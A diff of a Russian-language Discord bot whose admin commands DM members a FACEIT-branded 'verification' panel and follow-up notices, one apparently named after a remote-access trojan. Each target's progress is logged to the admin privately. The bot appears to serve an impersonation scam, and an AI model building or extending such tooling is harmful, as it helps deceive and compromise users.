@@ -259,7 +259,7 @@ user_tracking = {}
 
 
 async def update_tracking_log(user_id: int):
-    """Обновляет эмбед с логом действий пользователя."""
+    """Обновляет эмбед с логом действий пользователя в ЛС админа."""
     if user_id not in user_tracking:
         return
     
@@ -267,10 +267,11 @@ async def update_tracking_log(user_id: int):
     message = data["message"]
     log_lines = data["log"]
     
-    # Создаём обновлённый эмбед (без цвета)
+    # Создаём обновлённый эмбед
     embed = discord.Embed(
         title=f"📊 Лог взаимодействия: <@{user_id}>",
         description="\n".join(log_lines),
+        color=discord.Color.blue()
     )
     
     try:
@@ -675,13 +676,8 @@ user_tracking = {}
 @app_commands.default_permissions(manage_guild=True)
 @app_commands.guild_only()
 async def verif(interaction: discord.Interaction, member: discord.Member, game: app_commands.Choice[str]):
-    # Проверка канала
-    if ALLOWED_CHANNEL_ID and interaction.channel_id != ALLOWED_CHANNEL_ID:
-        await interaction.response.send_message("Пошел нахуй")
-        return
-    
     if member.bot:
-        await interaction.response.send_message("Нельзя отправить верификацию боту.")
+        await interaction.response.send_message("Нельзя отправить верификацию боту.", ephemeral=True)
         return
 
     game_value = game.value if isinstance(game, app_commands.Choice) else game
@@ -690,25 +686,33 @@ async def verif(interaction: discord.Interaction, member: discord.Member, game: 
         await member.send(view=LanguageView(game_value), files=[banner_file(), faceit_logo_file()])
     except discord.Forbidden:
         await interaction.response.send_message(
-            f"Не удалось написать {member.mention}: у него закрыты личные сообщения."
+            f"Не удалось написать {member.mention}: у него закрыты личные сообщения.",
+            ephemeral=True
         )
         return
 
-    # Создаём эмбед для отслеживания (без цвета слева)
-    tracking_embed = discord.Embed(
+    # Отправляем лог в ЛС отправителю
+    log_embed = discord.Embed(
         title=f"📊 Лог взаимодействия: {member}",
         description=f"**{discord.utils.format_dt(discord.utils.utcnow(), 'F')}** | Панель отправлена в личные сообщения {member.mention}",
+        color=discord.Color.green()
     )
-    tracking_message = await interaction.channel.send(embed=tracking_embed)
     
-    # Сохраняем для отслеживания
-    user_tracking[member.id] = {
-        "message": tracking_message,
-        "log": [f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | Панель отправлена"]
-    }
+    try:
+        tracking_message = await interaction.user.send(embed=log_embed)
+        
+        # Сохраняем для отслеживания
+        user_tracking[member.id] = {
+            "message": tracking_message,
+            "log": [f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | Панель отправлена"],
+            "admin_id": interaction.user.id  # Сохраняем ID админа для отправки обновлений
+        }
+    except discord.Forbidden:
+        pass
 
     await interaction.response.send_message(
-        f"Верификация ({game.name}) отправлена {member.mention} в личку ✅"
+        f"Верификация ({game.name}) отправлена {member.mention} в личку ✅",
+        ephemeral=True
     )
 
 
@@ -728,13 +732,8 @@ async def verif(interaction: discord.Interaction, member: discord.Member, game: 
 @app_commands.default_permissions(manage_guild=True)
 @app_commands.guild_only()
 async def ratka(interaction: discord.Interaction, member: discord.Member, language: app_commands.Choice[str]):
-    # Проверка канала
-    if ALLOWED_CHANNEL_ID and interaction.channel_id != ALLOWED_CHANNEL_ID:
-        await interaction.response.send_message("Пошел нахуй")
-        return
-    
     if member.bot:
-        await interaction.response.send_message("Нельзя отправить уведомление боту.")
+        await interaction.response.send_message("Нельзя отправить уведомление боту.", ephemeral=True)
         return
 
     lang = language.value if isinstance(language, app_commands.Choice) else language
@@ -759,11 +758,12 @@ async def ratka(interaction: discord.Interaction, member: discord.Member, langua
         await member.send(embed=embed, files=[ratka_image_file(), logo_file()])
     except discord.Forbidden:
         await interaction.response.send_message(
-            f"Не удалось написать {member.mention}: у него закрыты личные сообщения."
+            f"Не удалось написать {member.mention}: у него закрыты личные сообщения.",
+            ephemeral=True
         )
         return
 
-    # Логируем отправку уведомления ratka
+    # Логируем отправку ratka - отправляем в ЛС админу
     if member.id in user_tracking:
         user_tracking[member.id]["log"].append(
             f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | 📨 Отправлено уведомление **ratka** ({language.name})"
@@ -771,7 +771,8 @@ async def ratka(interaction: discord.Interaction, member: discord.Member, langua
         await update_tracking_log(member.id)
 
     await interaction.response.send_message(
-        f"Уведомление ({language.name}) отправлено {member.mention} в личку ✅"
+        f"Уведомление ({language.name}) отправлено {member.mention} в личку ✅",
+        ephemeral=True
     )
 
 
@@ -791,13 +792,8 @@ async def ratka(interaction: discord.Interaction, member: discord.Member, langua
 @app_commands.default_permissions(manage_guild=True)
 @app_commands.guild_only()
 async def final(interaction: discord.Interaction, member: discord.Member, language: app_commands.Choice[str]):
-    # Проверка канала
-    if ALLOWED_CHANNEL_ID and interaction.channel_id != ALLOWED_CHANNEL_ID:
-        await interaction.response.send_message("Пошел нахуй")
-        return
-    
     if member.bot:
-        await interaction.response.send_message("Нельзя отправить уведомление боту.")
+        await interaction.response.send_message("Нельзя отправить уведомление боту.", ephemeral=True)
         return
 
     lang = language.value if isinstance(language, app_commands.Choice) else language
@@ -820,11 +816,12 @@ async def final(interaction: discord.Interaction, member: discord.Member, langua
         await member.send(embed=embed, file=logo_file())
     except discord.Forbidden:
         await interaction.response.send_message(
-            f"Не удалось написать {member.mention}: у него закрыты личные сообщения."
+            f"Не удалось написать {member.mention}: у него закрыты личные сообщения.",
+            ephemeral=True
         )
         return
 
-    # Логируем отправку final
+    # Логируем отправку final - отправляем в ЛС админу
     if member.id in user_tracking:
         user_tracking[member.id]["log"].append(
             f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | ✅ Отправлено уведомление **final** ({language.name}) — заявка принята"
@@ -832,7 +829,8 @@ async def final(interaction: discord.Interaction, member: discord.Member, langua
         await update_tracking_log(member.id)
 
     await interaction.response.send_message(
-        f"Уведомление о принятии ({language.name}) отправлено {member.mention} в личку ✅"
+        f"Уведомление о принятии ({language.name}) отправлено {member.mention} в личку ✅",
+        ephemeral=True
     )
 
 
@@ -852,13 +850,8 @@ async def final(interaction: discord.Interaction, member: discord.Member, langua
 @app_commands.default_permissions(manage_guild=True)
 @app_commands.guild_only()
 async def oshibka(interaction: discord.Interaction, member: discord.Member, language: app_commands.Choice[str]):
-    # Проверка канала
-    if ALLOWED_CHANNEL_ID and interaction.channel_id != ALLOWED_CHANNEL_ID:
-        await interaction.response.send_message("Пошел нахуй")
-        return
-    
     if member.bot:
-        await interaction.response.send_message("Нельзя отправить уведомление боту.")
+        await interaction.response.send_message("Нельзя отправить уведомление боту.", ephemeral=True)
         return
 
     lang = language.value if isinstance(language, app_commands.Choice) else language
@@ -879,11 +872,12 @@ async def oshibka(interaction: discord.Interaction, member: discord.Member, lang
         await member.send(embed=embed, file=logo_file())
     except discord.Forbidden:
         await interaction.response.send_message(
-            f"Не удалось написать {member.mention}: у него закрыты личные сообщения."
+            f"Не удалось написать {member.mention}: у него закрыты личные сообщения.",
+            ephemeral=True
         )
         return
 
-    # Логируем отправку oshibka
+    # Логируем отправку oshibka - отправляем в ЛС админу
     if member.id in user_tracking:
         user_tracking[member.id]["log"].append(
             f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | ⚠️ Отправлено уведомление **oshibka** ({language.name}) — техническая ошибка"
@@ -891,7 +885,8 @@ async def oshibka(interaction: discord.Interaction, member: discord.Member, lang
         await update_tracking_log(member.id)
 
     await interaction.response.send_message(
-        f"Уведомление об ошибке ({language.name}) отправлено {member.mention} в личку ✅"
+        f"Уведомление об ошибке ({language.name}) отправлено {member.mention} в личку ✅",
+        ephemeral=True
     )
 
 
